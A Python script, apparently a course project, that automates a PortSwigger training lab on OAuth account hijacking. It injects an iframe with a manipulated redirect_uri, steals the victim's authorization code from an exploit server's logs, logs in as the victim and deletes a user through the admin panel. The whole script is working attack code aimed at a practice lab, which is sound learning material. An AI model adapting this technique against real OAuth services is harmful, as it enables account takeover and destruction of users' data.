# By Andrew Stevenson for CS595 at PSU Spring '21 Final Project
# Solves lab: https://portswigger.net/web-security/oauth/lab-oauth-account-hijacking-via-redirect-uri

import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs

s = requests.Session()

# Get login form
site = 'ac3c1f511ef119198069126f005c00c1.web-security-academy.net'
my_account_url = f'https://{site}/my-account'
resp = s.get(my_account_url)
soup = BeautifulSoup(resp.text, 'html.parser')
exploit_site = soup.find('a', {'id': 'exploit-link'})['href'][8:]  # Stash this for later
sm_login_url = soup.meta['content'][6:]
client_id = parse_qs(urlparse(sm_login_url).query)['client_id'][0]
resp = s.get(sm_login_url)

# Log in with social media
soup = BeautifulSoup(resp.text, 'html.parser')
auth_site = urlparse(resp.request.url).hostname
submit_folder = soup.form['action']
form_data = {
    'username': 'wiener',
    'password': 'peter'
}
submit_url = f'https://{auth_site}{submit_folder}'
resp = s.post(submit_url, data=form_data)

# Confirm the social media login
soup = BeautifulSoup(resp.text, 'html.parser')
confirm_folder = soup.form['action']
confirm_url = f'https://{auth_site}{confirm_folder}'
s.post(confirm_url)

# Log out
logout_url = f'https://{site}/logout'
s.get(logout_url)

# Build & deliver the exploit
exploit_html = f'<iframe src="https://{auth_site}/auth?' \
               f'client_id={client_id}&redirect_uri=https://{exploit_site}&' \
               f'response_type=code&scope=openid%20profile%20email"></iframe>'
exploit_url = f'https://{exploit_site}'
form_data = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}
s.post(exploit_url, data=form_data)
print('Delivering exploit to victim...')

# Search the logs
logs_url = f'https://{exploit_site}/log'
resp = s.get(logs_url)
soup = BeautifulSoup(resp.text, 'html.parser')
beg = soup.pre.text.rfind('/?code') + 7
end = soup.pre.text.find('HTTP/1.1', beg) - 1
stolen_code = soup.pre.text[beg:end]

# Log in using stolen code
login_url = f'https://{site}/oauth-callback?code={stolen_code}'
s.get(login_url)

# Delete the target account
del_url = f'https://{site}/admin/delete?username=carlos'
resp = s.get(del_url)
soup = BeautifulSoup(resp.text, 'html.parser')
print(soup.find(text='Congratulations, you solved the lab!'))
